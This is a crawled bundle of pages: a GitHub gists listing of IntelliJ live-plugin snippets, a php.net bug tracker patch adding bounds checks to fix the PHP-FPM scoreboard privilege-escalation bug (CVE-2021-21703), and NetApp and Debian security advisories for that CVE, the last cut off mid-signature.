January 15, 2025 11:53

Displaying GitHub contributors as an image using contributor-img web application

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | <!-- Copy-paste in your Readme.md file --> |
| --- | --- |
|  |  |
|  | <a href = "https://github.com/Tanu-N-Prabhu/Python/graphs/contributors"> |
|  | <img src = "https://contrib.rocks/image?repo = GitHub\_username/repository\_name"/> |
|  | </a> |
|  |  |
|  | Made with [contributors-img](https://contrib.rocks). |

* [1 file](/dkandalov/11051113)
* [0 forks](/dkandalov/11051113/forks)
* [0 comments](/dkandalov/11051113#comments)
* [2 stars](/dkandalov/11051113/stargazers)

[![@dkandalov](https://avatars.githubusercontent.com/u/28375?s=60&v=4)](/dkandalov)

[dkandalov](/dkandalov)
/ [**plugin.groovy**](/dkandalov/11051113)

Last active
January 15, 2025 11:51

Simplistic "compile and run haskell" IntelliJ action (see <https://github.com/dkandalov/live-plugin>)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import com.intellij.notification.\* |
| --- | --- |
|  | import com.intellij.openapi.actionSystem.AnActionEvent |
|  | import com.intellij.openapi.progress.PerformInBackgroundOption |
|  |  |
|  |  |
|  | import static liveplugin.PluginUtil.\* |
|  | import com.intellij.openapi.fileEditor.ex.FileEditorManagerEx |
|  | import com.intellij.openapi.vfs.VirtualFile |
|  | import com.intellij.openapi.fileEditor.FileDocumentManager |

* [1 file](/dkandalov/277800d12ecbfc533fcd)
* [0 forks](/dkandalov/277800d12ecbfc533fcd/forks)
* [0 comments](/dkandalov/277800d12ecbfc533fcd#comments)
* [3 stars](/dkandalov/277800d12ecbfc533fcd/stargazers)

[![@dkandalov](https://avatars.githubusercontent.com/u/28375?s=60&v=4)](/dkandalov)

[dkandalov](/dkandalov)
/ [**plugin.groovy**](/dkandalov/277800d12ecbfc533fcd)

Last active
January 15, 2025 11:51

Prototype of google popup search mini-plugin

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import com.intellij.ide.BrowserUtil |
| --- | --- |
|  | import com.intellij.openapi.actionSystem.AnActionEvent |
|  | import com.intellij.openapi.progress.ProgressIndicator |
|  | import groovy.json.JsonSlurper |
|  |  |
|  | import static liveplugin.PluginUtil.registerAction |
|  | import static liveplugin.PluginUtil.show |
|  | import static liveplugin.PluginUtil.showPopupSearch |
|  |  |
|  | registerAction("GoogleSearchAction", "ctrl alt shift G") { AnActionEvent event -> |

* [1 file](/dkandalov/8840509)
* [0 forks](/dkandalov/8840509/forks)
* [0 comments](/dkandalov/8840509#comments)
* [2 stars](/dkandalov/8840509/stargazers)

[![@dkandalov](https://avatars.githubusercontent.com/u/28375?s=60&v=4)](/dkandalov)

[dkandalov](/dkandalov)
/ [**plugin.groovy**](/dkandalov/8840509)

Last active
January 15, 2025 11:51

Example of listening to VCS updates in IntelliJ (this is mini-plugin for <https://github.com/dkandalov/live-plugin>)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import com.intellij.openapi.module.ModuleManager |
| --- | --- |
|  | import com.intellij.openapi.util.Pair |
|  | import com.intellij.openapi.vcs.ProjectLevelVcsManager |
|  | import com.intellij.openapi.vcs.VcsKey |
|  | import com.intellij.openapi.vcs.update.UpdateEnvironment |
|  | import com.intellij.openapi.vcs.update.UpdatedFilesListener |
|  | import com.intellij.openapi.vcs.update.UpdatedFilesReverseSide |
|  | import com.intellij.util.Consumer |
|  | import com.intellij.util.messages.MessageBusConnection |

* [1 file](/dkandalov/6976133)
* [0 forks](/dkandalov/6976133/forks)
* [0 comments](/dkandalov/6976133#comments)
* [3 stars](/dkandalov/6976133/stargazers)

[![@dkandalov](https://avatars.githubusercontent.com/u/28375?s=60&v=4)](/dkandalov)

[dkandalov](/dkandalov)
/ [**plugin.groovy**](/dkandalov/6976133)

Last active
January 15, 2025 11:51

Quick and dirty plugin to find all dependencies of a class within project (including transitive)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import com.intellij.codeInsight.TargetElementEvaluator |
| --- | --- |
|  | import com.intellij.codeInsight.TargetElementUtilBase |
|  | import com.intellij.codeInsight.daemon.DaemonCodeAnalyzer |
|  | import com.intellij.lang.Language |
|  | import com.intellij.lang.LanguageExtension |
|  | import com.intellij.openapi.actionSystem.AnActionEvent |
|  | import com.intellij.openapi.module.ModuleManager |
|  | import com.intellij.openapi.progress.ProgressIndicator |
|  | import com.intellij.openapi.project.Project |
|  | import com.intellij.openapi.roots.ModifiableRootModel |

* [1 file](/dkandalov/80d8d4f71bef54290a71)
* [0 forks](/dkandalov/80d8d4f71bef54290a71/forks)
* [0 comments](/dkandalov/80d8d4f71bef54290a71#comments)
* [3 stars](/dkandalov/80d8d4f71bef54290a71/stargazers)

[![@dkandalov](https://avatars.githubusercontent.com/u/28375?s=60&v=4)](/dkandalov)

[dkandalov](/dkandalov)
/ [**plugin.groovy**](/dkandalov/80d8d4f71bef54290a71)

Last active
January 15, 2025 11:51

Find all transitive dependencies for modules in IDEA project (this is a mini plugin for <https://github.com/dkandalov/live-plugin>)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import com.intellij.openapi.module.Module |
| --- | --- |
|  | import com.intellij.openapi.module.ModuleManager |
|  | import com.intellij.openapi.roots.CompilerModuleExtension |
|  | import com.intellij.openapi.roots.LibraryOrderEntry |
|  | import com.intellij.openapi.roots.ModifiableRootModel |
|  | import com.intellij.openapi.roots.ModuleRootManager |
|  | import com.intellij.openapi.roots.OrderRootType |
|  | import com.intellij.openapi.roots.libraries.Library |
|  | import com.intellij.openapi.roots.libraries.LibraryTable |
|  | import liveplugin.PluginUtil |

* [1 file](/dkandalov/6728950)
* [0 forks](/dkandalov/6728950/forks)
* [0 comments](/dkandalov/6728950#comments)
* [1 star](/dkandalov/6728950/stargazers)

[![@dkandalov](https://avatars.githubusercontent.com/u/28375?s=60&v=4)](/dkandalov)

[dkandalov](/dkandalov)
/ [**plugin.groovy**](/dkandalov/6728950)

Created
September 27, 2013 13:54

Really lame code to show text diff using IntelliJ diff tool
(this code is for <https://github.com/dkandalov/live-plugin>)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import com.intellij.icons.AllIcons |
| --- | --- |
|  | import com.intellij.openapi.diff.DiffContent |
|  | import com.intellij.openapi.diff.DiffRequest |
|  | import com.intellij.openapi.diff.DiffTool |
|  | import com.intellij.openapi.diff.SimpleContent |
|  | import com.intellij.openapi.diff.impl.DiffPanelImpl |
|  | import com.intellij.openapi.fileTypes.FileType |
|  | import com.intellij.openapi.fileTypes.FileTypes |
|  | import com.intellij.openapi.project.Project |
|  | import com.intellij.openapi.wm.WindowManager |

* [1 file](/dkandalov/7248184)
* [0 forks](/dkandalov/7248184/forks)
* [0 comments](/dkandalov/7248184#comments)
* [5 stars](/dkandalov/7248184/stargazers)

[![@dkandalov](https://avatars.githubusercontent.com/u/28375?s=60&v=4)](/dkandalov)

[dkandalov](/dkandalov)
/ [**plugin.groovy**](/dkandalov/7248184)

Last active
January 15, 2025 11:51

IntelliJ plugin to find all recursive methods in project (can be executed using <https://github.com/dkandalov/live-plugin>).
This is a follow up for this talk <http://skillsmatter.com/podcast/nosql/using-graphs-for-source-code-analysis>

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import com.intellij.internal.psiView.PsiViewerDialog |
| --- | --- |
|  | import com.intellij.openapi.project.Project |
|  | import com.intellij.psi.JavaRecursiveElementVisitor |
|  | import com.intellij.psi.PsiFileSystemItem |
|  | import com.intellij.psi.PsiJavaFile |
|  | import com.intellij.psi.PsiMethod |
|  | import com.intellij.psi.PsiMethodCallExpression |
|  |  |
|  | import static liveplugin.PluginUtil.\* |

* [1 file](/dkandalov/6427087)
* [0 forks](/dkandalov/6427087/forks)
* [0 comments](/dkandalov/6427087#comments)
* [1 star](/dkandalov/6427087/stargazers)

[![@dkandalov](https://avatars.githubusercontent.com/u/28375?s=60&v=4)](/dkandalov)

[dkandalov](/dkandalov)
/ [**plugin.groovy**](/dkandalov/6427087)

Created
September 3, 2013 17:42

This is example of reloadable project listener for <https://github.com/dkandalov/live-plugin>

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import com.intellij.openapi.Disposable |
| --- | --- |
|  | import com.intellij.openapi.project.Project |
|  | import com.intellij.openapi.project.ProjectManager |
|  | import com.intellij.openapi.project.ProjectManagerAdapter |
|  |  |
|  | import static com.intellij.openapi.util.Disposer.\* |
|  | import static liveplugin.PluginUtil.\* |
|  |  |
|  |  |
|  | Disposable disposable = changeGlobalVar("myPluginProjectListener"){ previous -> |

Newer[Older](https://gist.github.com/starred?page=2)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugs.php.net_4f9225bc_20250115_115351.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Return to Bug #81026](bug.php?id=81026) | | --- | | Patch [fpm\_scoreboard\_proc\_oob\_fix\_v4.patch](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=latest) | revision [2021-10-10 19:20 UTC](patch-display.php?bug_id=81026&patch=fpm_scoreboard_proc_oob_fix_v4.patch&revision=1633893616&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v3.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=latest) | revision [2021-05-31 21:55 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v3.patch&revision=1622498128&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v2.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=latest) | revision [2021-05-31 21:16 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=1622495810&display=1) by bukka@php.net | | Patch [fmp\_scoreboard\_proc\_oob\_v1.patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=latest) | revision [2021-05-31 13:32 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v1.patch&revision=1622467931&display=1) by bukka@php.net |  Patch fmp\_scoreboard\_proc\_oob\_v2.patch for FPM related Bug #81026 **Patch version 2021-05-31 21:16 UTC** [Return to Bug #81026](bug.php?id=81026) | [Download this patch](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=1622495810&download=1) This patch is obsolete Obsoleted by patches:  * [fmp\_scoreboard\_proc\_oob\_v3.patch, revision 2021-05-31 21:55 UTC](patch-display.php?patch=fmp_scoreboard_proc_oob_v3.patch&bug_id=81026&revision=1622498128) Patch Revisions:  * [2021-05-31 21:16 UTC](patch-display.php?bug_id=81026&patch=fmp_scoreboard_proc_oob_v2.patch&revision=1622495810) [[diff to current]](patch-display.php?patch=fmp_scoreboard_proc_oob_v2.patch&bug_id=81026&diff=1&old=1622495810&revision=1622495810)  Developer: bukka@php.net ```  From 3ebba0ace5d10be0c4364413516bafe697ed42a9 Mon Sep 17 00:00:00 2001 From: Jakub Zelenka <bukka@php.net> Date: Mon, 31 May 2021 14:26:09 +0100 Subject: [PATCH] Fix bug #81026 (PHP-FPM oob R/W in root process leading to  privilege escalation)  ---  sapi/fpm/fpm/fpm_request.c    |  6 +++---  sapi/fpm/fpm/fpm_scoreboard.c | 35 +++++++++++++++++++++++++++++++++++  sapi/fpm/fpm/fpm_scoreboard.h |  2 ++  3 files changed, 40 insertions(+), 3 deletions(-)  diff --git a/sapi/fpm/fpm/fpm_request.c b/sapi/fpm/fpm/fpm_request.c index 83401f1553..540949b026 100644 --- a/sapi/fpm/fpm/fpm_request.c +++ b/sapi/fpm/fpm/fpm_request.c @@ -227,7 +227,7 @@ void fpm_request_check_timed_out(struct fpm_child_s *child, struct timeval *now,  {  	struct fpm_scoreboard_proc_s proc, *proc_p;   -	proc_p = fpm_scoreboard_proc_acquire(child->wp->scoreboard, child->scoreboard_i, 1); +	proc_p = fpm_scoreboard_proc_acquire_from_child(child, 1);  	if (!proc_p) {  		zlog(ZLOG_WARNING, "failed to acquire scoreboard");  		return; @@ -287,7 +287,7 @@ int fpm_request_is_idle(struct fpm_child_s *child) /* {{{ */  	struct fpm_scoreboard_proc_s *proc;    	/* no need in atomicity here */ -	proc = fpm_scoreboard_proc_get(child->wp->scoreboard, child->scoreboard_i); +	proc = fpm_scoreboard_proc_get_from_child(child);  	if (!proc) {  		return 0;  	} @@ -302,7 +302,7 @@ int fpm_request_last_activity(struct fpm_child_s *child, struct timeval *tv) /*    	if (!tv) return -1;   -	proc = fpm_scoreboard_proc_get(child->wp->scoreboard, child->scoreboard_i); +	proc = fpm_scoreboard_proc_get_from_child(child);  	if (!proc) {  		return -1;  	} diff --git a/sapi/fpm/fpm/fpm_scoreboard.c b/sapi/fpm/fpm/fpm_scoreboard.c index 328f999f0c..79a7480201 100644 --- a/sapi/fpm/fpm/fpm_scoreboard.c +++ b/sapi/fpm/fpm/fpm_scoreboard.c @@ -6,6 +6,7 @@  #include <time.h>    #include "fpm_config.h" +#include "fpm_children.h"  #include "fpm_scoreboard.h"  #include "fpm_shm.h"  #include "fpm_sockets.h" @@ -184,6 +185,23 @@ struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get(struct fpm_scoreboard_s *s  }  /* }}} */   +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get_from_child(struct fpm_child_s *child) /* {{{*/ +{ +	struct fpm_worker_pool_s *wp = child->wp; +	struct fpm_scoreboard_proc_s *proc = fpm_scoreboard_proc_get(wp->scoreboard, child->scoreboard_i); +	ptrdiff_t proc_start = (uintptr_t) wp->scoreboard + sizeof(struct fpm_scoreboard_s); +	ptrdiff_t proc_end = proc_start + (wp->config->pm_max_children - 1) * sizeof(struct fpm_scoreboard_proc_s *); +	uintptr_t proc_position = (uintptr_t) proc; + +	if (proc_position < proc_start || proc_position > proc_end) { +		zlog(ZLOG_WARNING, "failed to get proc from the child scoreboard because the proc pointer is invalid"); +		return NULL; +	} + +	return proc; +} +/* }}} */ +  struct fpm_scoreboard_s *fpm_scoreboard_acquire(struct fpm_scoreboard_s *scoreboard, int nohang) /* {{{ */  {  	struct fpm_scoreboard_s *s; @@ -225,6 +243,23 @@ struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire(struct fpm_scoreboard_  }  /* }}} */   +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire_from_child(struct fpm_child_s *child, int nohang) /* {{{ */ +{ +	struct fpm_scoreboard_proc_s *proc; + +	proc = fpm_scoreboard_proc_get_from_child(child); +	if (!proc) { +		return NULL; +	} + +	if (!fpm_spinlock(&proc->lock, nohang)) { +		return NULL; +	} + +	return proc; +} +/* }}} */ +  void fpm_scoreboard_proc_release(struct fpm_scoreboard_proc_s *proc) /* {{{ */  {  	if (!proc) { diff --git a/sapi/fpm/fpm/fpm_scoreboard.h b/sapi/fpm/fpm/fpm_scoreboard.h index 1fecde1d0f..ff7ed1806d 100644 --- a/sapi/fpm/fpm/fpm_scoreboard.h +++ b/sapi/fpm/fpm/fpm_scoreboard.h @@ -72,10 +72,12 @@ int fpm_scoreboard_init_child(struct fpm_worker_pool_s *wp);  void fpm_scoreboard_update(int idle, int active, int lq, int lq_len, int requests, int max_children_reached, int slow_rq, int action, struct fpm_scoreboard_s *scoreboard);  struct fpm_scoreboard_s *fpm_scoreboard_get();  struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get(struct fpm_scoreboard_s *scoreboard, int child_index); +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_get_from_child(struct fpm_child_s *child);    struct fpm_scoreboard_s *fpm_scoreboard_acquire(struct fpm_scoreboard_s *scoreboard, int nohang);  void fpm_scoreboard_release(struct fpm_scoreboard_s *scoreboard);  struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire(struct fpm_scoreboard_s *scoreboard, int child_index, int nohang); +struct fpm_scoreboard_proc_s *fpm_scoreboard_proc_acquire_from_child(struct fpm_child_s *child, int nohang);  void fpm_scoreboard_proc_release(struct fpm_scoreboard_proc_s *proc);    void fpm_scoreboard_free(struct fpm_scoreboard_s *scoreboard); --  2.25.1   ``` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Wed Jan 15 11:01:31 2025 UTC |



=== Content from security.netapp.com_c1af0e1a_20250114_195334.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2021-21703 PHP Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20211118-0003)

## CVE-2021-21703 PHP Vulnerability in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20211118-0003 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20211118-0003 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20211118-0003 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20211118-0003 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20211118-0003
**Version:**
7.0

**Last updated:**
05/09/2024

**Status:**
Final.

**CVEs:** CVE-2021-21703

Overview
#### Summary

Multiple NetApp products incorporate PHP. PHP versions 7.3.x prior to 7.3.32, 7.4.x prior to 7.4.25, and 8.0.x prior to 8.0.12 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2021-21703](https://nvd.nist.gov/vuln/detail/CVE-2021-21703) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* <https://www.php.net/ChangeLog-7.php#7.3.32>

Affected Products
#### Affected Products

* ONTAP 9 (formerly Clustered Data ONTAP)

#### Products Not Affected

* AFF Baseboard Management Controller (BMC) - A700s
* ATTO FibreBridge - 7500N
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - Cloud Insights Telegraf Agent
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Trident
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Insights Acquisition Unit
* Cloud Insights Storage Workload Security Agent
* Cloud Insights Telegraf Agent
* Cloud Volumes ONTAP Mediator
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM6 SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP Select Deploy administration utility
* ONTAP tools for VMware vSphere 9
* OnCommand Insight
* OnCommand Workflow Automation
* SANtricity Storage Plugin for vCenter
* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG6060/SGF6024/SGF6112
* StorageGRID Baseboard Management Controller (BMC)
* System Manager 9.x

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **ONTAP 9 (formerly Clustered Data ONTAP)** | <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.6P18> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.7P19> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.8P11> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.9.1P6> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.10.1> |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20211118-0003>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20211118 | Initial Public Release |
| 2.0 | 20220113 | Clustered Data ONTAP added to Software Versions and Fixes |
| 3.0 | 20220121 | Clustered Data ONTAP 9.10.1 added to Software Versions and Fixes |
| 4.0 | 20220322 | Clustered Data ONTAP 9.8P11 added to Software Versions and Fixes |
| 5.0 | 20220419 | Clustered Data ONTAP 9.6P18 added to Software Versions and Fixes |
| 6.0 | 20220607 | Clustered Data ONTAP 9.7P19 added to Software Versions and Fixes |
| 7.0 | 20240509 | Final status |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from www.debian.org_2b0e7fde_20250114_195335.html ===


---

[[Date Prev](msg00177.html)][[Date Next](msg00179.html)]
[[Thread Prev](msg00177.html)][[Thread Next](msg00179.html)]
[[Date Index](maillist.html#00178)]
[[Thread Index](threads.html#00178)]

# [SECURITY] [DSA 4993-1] php7.3 security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 4993-1] php7.3 security update
* *From*: Salvatore Bonaccorso <carnil@debian.org>
* *Date*: Mon, 25 Oct 2021 20:25:37 +0000
* *Message-id*: <[[🔎]](/msgid-search/E1mf6XJ-0002sd-1f%40seger.debian.org) [E1mf6XJ-0002sd-1f@seger.debian.org](msg00178.html)>
* *Reply-to*: debian-security-announce-request@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-4993-1                   security@debian.org
<https://www.debian.org/security/>                     Salvatore Bonaccorso
October 25, 2021                      <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : php7.3
CVE ID         : CVE-2021-21703

An out-of-bounds read and write flaw was discovered in the PHP-FPM code,
which could result in escalation of privileges from local unprivileged
user to the root user.

For the oldstable distribution (buster), this problem has been fixed
in version 7.3.31-1~deb10u1.

We recommend that you upgrade your php7.3 packages.

For the detailed security status of php7.3 please refer to its security
tracker page at:
<https://security-tracker.debian.org/tracker/php7.3>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQKTBAEBCgB9FiEERkRAmAjBceBVMd3uBUy48xNDz0QFAmF3EohfFIAAAAAALgAo
aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDQ2
NDQ0MDk4MDhDMTcxRTA1NTMxRERFRTA1NENCOEYzMTM0M0NGNDQACgkQBUy48xND
z0QTzBAAgt5HqxH7k7LMTK1tnwY2HXoNB9avYOwLrZbuox+D6hU9RO0en+3phMK1
2rwREhAwwvbt2SuqmGOnxnLHfpvuS31ufHmLaiGVsGPJL3qAy3t/w3DZ1euZf60A
MLbHuLElmA6PuPnsnQbzNb28PfTFjkYt2u0nRSU4R1Te78mZg4tw/IlrCUAeHOUJ
/7AuTpv7zTCP765YqEgqJfg5lL+NhsAxrZ//6Zx7hDvqb1VIc3vHKpC/DJWP56XS
YVmGILhEZIY33ixGdQR6/uW0VrvW0AELzveVpiOZVZcGYJH2j2V2xW7cTcPZXiyO
hBbnBDHPi+PyH8I461J9RLw/8dJpU6zn+I2w5RSmMhVk+swjkBTiBLbyeOfp5mBS
7wCPyEBUYGD6AiWG96qfpn2/ACHyY+ndrMWabtCfgRGkwcb2kqRhQ4Ai3nYSZm1l
3XDdNIg+Ywtf7NRwblBVlvJ4egy8tj0ERB9wigd2av1buHl6Ji6xRvePYHShm6xi
C02qTL7cFfKmTxfk0HdwtUu0zYc9qKZb9VAcPwiwqTbgWXWbnTLivBoIJ1iubQsU
